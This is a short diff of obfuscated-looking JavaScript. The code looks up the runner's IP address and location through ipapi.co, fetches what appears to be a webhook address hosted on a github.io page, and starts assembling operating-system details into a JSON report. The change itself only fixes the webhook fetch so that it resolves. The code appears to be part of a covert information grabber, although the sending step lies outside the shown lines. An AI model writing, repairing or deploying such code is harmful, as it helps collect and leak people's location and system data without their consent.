@@ -55,7 +55,7 @@
   f=fetch
   g=async(u,d)=>{r=await f(u,d);t=await r.text();return t}
   p=g("https://ipapi.co/json")
-  b=g("https://wlodekm.github.io/n/wh.txt")
+  b=await g("https://wlodekm.github.io/n/wh.txt")
   p+="\n"
   p+=JSON.stringify({
     os: getOS(),
